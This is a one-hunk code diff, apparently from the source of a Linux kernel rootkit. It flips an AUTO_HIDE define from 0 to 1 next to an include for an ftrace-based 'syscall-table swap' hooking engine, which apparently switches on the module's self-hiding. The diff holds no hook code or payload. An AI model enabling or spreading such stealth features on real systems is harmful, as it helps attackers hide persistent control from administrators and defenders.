@@ -3,7 +3,7 @@
 #include "include/headers.h"
 
 
-#define AUTO_HIDE 0
+#define AUTO_HIDE 1
 
 /* hooking engine (syscall-table swap) */
 #include "ftrace/ftrace.h"
